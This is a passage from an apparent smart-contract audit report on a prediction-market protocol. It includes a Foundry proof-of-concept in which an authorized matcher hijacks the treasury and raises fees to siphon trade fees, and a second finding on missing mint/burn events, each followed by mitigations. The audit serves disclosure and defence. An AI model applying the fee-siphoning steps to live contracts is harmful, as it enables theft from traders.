        controller.initialize(owner, address(positionTokens), address(resolver), address(vault), address(market), oracle);

        // Link contracts
        vm.prank(owner); positionTokens.setMarketController(address(controller));
        vm.prank(owner); vault.setMarketController(address(controller));
        vm.prank(owner); market.setMarketController(address(controller));

        // Fund users and deposit to vault
        usdc.mint(buyer, 1_000 ether);
        usdc.mint(seller, 1_000 ether);
        vm.startPrank(buyer);
        usdc.approve(address(vault), type(uint256).max);
        vault.depositCollateral(500 ether);
        vm.stopPrank();
        vm.startPrank(seller);
        usdc.approve(address(vault), type(uint256).max);
        vault.depositCollateral(500 ether);
        vm.stopPrank();

        // Authorize attacker as matcher
        vm.prank(owner);
        controller.setAuthorizedMatcher(attacker, true);

        // Create a simple 2-outcome market
        bytes32 qId = keccak256("MARKET_Q");
        vm.prank(attacker);
        controller.createMarket(qId, 2, 0, 0);
    }

    function _signOrder(IMarketController.Order memory order, uint256 pk) internal view returns (bytes memory sig) {
        bytes32 digest = controller.getOrderHash(order);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);
        sig = abi.encodePacked(r, s, v);
    }

    function test_MatcherHijacksTreasuryAndSiphonsTradeFees() public {
        // Attacker hijacks treasury and sets high trade fee rate
        vm.startPrank(attacker);
        controller.setTreasury(attacker);
        controller.setTradeFeeRate(1000); // 10%
        vm.stopPrank();

        // Prepare matching orders (buyer vs seller) for JIT minting path
        bytes32 qId = keccak256("MARKET_Q");
        IMarketController.Order memory buy = IMarketController.Order({
            user: buyer,
            questionId: qId,
            outcome: 1,            // YES
            amount: 100 ether,     // token amount
            price: 6000,           // 60%
            nonce: 1,
            expiration: block.timestamp + 1 days,
            isBuyOrder: true
        });
        IMarketController.Order memory sell = IMarketController.Order({
            user: seller,
            questionId: qId,
            outcome: 1,
            amount: 100 ether,
            price: 6000,           // execute at seller's price
            nonce: 1,
            expiration: block.timestamp + 1 days,
            isBuyOrder: false
        });

        bytes memory sigBuy = _signOrder(buy, buyerPk);
        bytes memory sigSell = _signOrder(sell, sellerPk);

        uint256 attackerBalBefore = vault.getAvailableBalance(attacker);

        // Execute match as attacker (authorized matcher)
        vm.prank(attacker);
        controller.executeOrderMatch(buy, sell, sigBuy, sigSell, 100 ether);

        // In JIT: buyerPayment=60, sellerPayment=40, tradeFee=10% each => 6 + 4 = 10 to treasury
        uint256 attackerBalAfter = vault.getAvailableBalance(attacker);
        assertGt(attackerBalAfter, attackerBalBefore);
        assertEq(attackerBalAfter - attackerBalBefore, 10 ether);
    }
}


## Suggested Mitigation
Restrict setTreasury to onlyOwner. Similarly, align all admin-config setters with intended privileges: setFeeRate, setUserFeeRate, setTradeFeeRate, setUserTradeFeeRate, setGlobalTradingPaused, setMarketTradingPaused, batchSetMarketTradingPaused should be reviewed and gated appropriately (e.g., onlyOwner for governance-level parameters; separate MATCHER_ROLE only for execution paths). Consider replacing onlyAuthorizedMatcher with AccessControl roles (OWNER/GOVERNOR vs MATCHER) and add a 2-step propose/accept (or timelock) for treasury changes. Add tests enforcing these access boundaries.





 **Derived From** : On mint/burn, the contract should emit IPositionTokens.PositionTokensMinted/PositionTokensBurned with arrays and conditionId matching the operation

## [L-20]. PositionTokens fails to emit custom mint/burn events (no conditionId), breaking referential event invariant and off-chain observability

## Derived From Pattern/Invariant
On mint/burn, the contract should emit IPositionTokens.PositionTokensMinted/PositionTokensBurned with arrays and conditionId matching the operation

## Exploit Type
EventConsistency

## Location
PositionTokens.mintBatch/burnBatch

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
## Minimim Privilege Required
Permissionless

## Description
IPositionTokens declares PositionTokensMinted/PositionTokensBurned events with a conditionId, but PositionTokens.mintBatch and burnBatch only trigger standard ERC1155 TransferBatch/TransferSingle events. There is no way to populate conditionId because the functions do not accept it and tokenId is keccak(conditionId, outcome) (non-invertible). Indexers/analytics relying on the custom events to tie mints/burns to a conditionId will miss these operations or be unable to attribute them correctly, causing downstream DoS/misaccounting. Vulnerable snippet:

function mintBatch(address to, uint256[] calldata ids, uint256[] calldata amounts) external onlyMarketController {
    _mintBatch(to, ids, amounts, ""); // no PositionTokensMinted emitted, no conditionId available
}
...
function burnBatch(address from, uint256[] calldata ids, uint256[] calldata amounts) external onlyMarketController {
    _burnBatch(from, ids, amounts); // no PositionTokensBurned emitted, no conditionId available
}

## Impact
Functional DoS and data integrity break for off-chain systems that expect PositionTokensMinted/PositionTokensBurned with conditionId. Indexers cannot attribute balances/volume to conditionId; orderbook/analytics relying on these events may fail to reflect inventory and settlement, impacting matching and monitoring.

## Proof of Concept
Any user flow that triggers mint/burn (e.g., a claim or matched trade) will not emit the custom events. Off-chain services filtering for PositionTokensMinted/PositionTokensBurned will miss these state changes entirely or be unable to associate them with conditionId, breaking tracking and potentially halting matching pipelines.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import "forge-std/Test.sol";
import {PositionTokens} from "src/Token/PositionTokens.sol";

contract PositionTokensEventsTest is Test {
    PositionTokens pos;
    address owner = address(0xA11CE);
    address marketController = address(0xBEEF);
    address user = address(0xCAFE);

    function setUp() public {
        pos = new PositionTokens();
        pos.initialize(owner);
        vm.prank(owner);
        pos.setMarketController(marketController);
    }

    function test_MintBurn_MissCustomEvents_ConditionIdUnavailable() public {
        // Prepare a realistic token id
        bytes32 conditionId = keccak256("cond-1");
        uint256[] memory ids = new uint256[](1);
        uint256[] memory amounts = new uint256[](1);
        ids[0] = pos.getTokenId(conditionId, 1);
        amounts[0] = 100;

        // Signatures of events
        bytes32 mintedSig = keccak256("PositionTokensMinted(address,uint256[],uint256[],bytes32)");
        bytes32 burnedSig = keccak256("PositionTokensBurned(address,uint256[],uint256[],bytes32)");
        bytes32 transferBatchSig = keccak256("TransferBatch(address,address,address,uint256[],uint256[])");

        // Mint
        vm.recordLogs();
        vm.prank(marketController);
        pos.mintBatch(user, ids, amounts);
        Vm.Log[] memory logsMint = vm.getRecordedLogs();

        bool sawCustomMinted = false;
        bool sawTransferBatchOnMint = false;
        for (uint256 i; i < logsMint.length; i++) {
            if (logsMint[i].topics.length > 0) {
                if (logsMint[i].topics[0] == mintedSig) sawCustomMinted = true;
                if (logsMint[i].topics[0] == transferBatchSig) sawTransferBatchOnMint = true;
            }
        }
        assertEq(sawCustomMinted, false, "PositionTokensMinted should be absent (bug)");
        assertEq(sawTransferBatchOnMint, true, "ERC1155 TransferBatch should be present on mint");

        // Burn
        vm.recordLogs();
        vm.prank(marketController);
        pos.burnBatch(user, ids, amounts);
        Vm.Log[] memory logsBurn = vm.getRecordedLogs();

        bool sawCustomBurned = false;
        bool sawTransferBatchOnBurn = false;
        for (uint256 i; i < logsBurn.length; i++) {
            if (logsBurn[i].topics.length > 0) {
                if (logsBurn[i].topics[0] == burnedSig) sawCustomBurned = true;
                if (logsBurn[i].topics[0] == transferBatchSig) sawTransferBatchOnBurn = true;
            }
        }
        assertEq(sawCustomBurned, false, "PositionTokensBurned should be absent (bug)");
        assertEq(sawTransferBatchOnBurn, true, "ERC1155 TransferBatch should be present on burn");
    }
}


## Suggested Mitigation
Emit the custom events with conditionId from the token contract or the orchestrator. Because conditionId cannot be derived from tokenId, pass it explicitly. For example, add functions: (1) mintBatchWithCondition(address to, uint256[] calldata ids, uint256[] calldata amounts, bytes32 conditionId) external onlyMarketController { _mintBatch(to, ids, amounts, ""); emit PositionTokensMinted(to, ids, amounts, conditionId); } and (2) burnBatchWithCondition(address from, uint256[] calldata ids, uint256[] calldata amounts, bytes32 conditionId) external onlyMarketController { _burnBatch(from, ids, amounts); emit PositionTokensBurned(from, ids, amounts, conditionId); }. Update MarketController to call these and deprecate the old functions, or alternatively emit equivalent events from MarketController at the time of mint/burn.



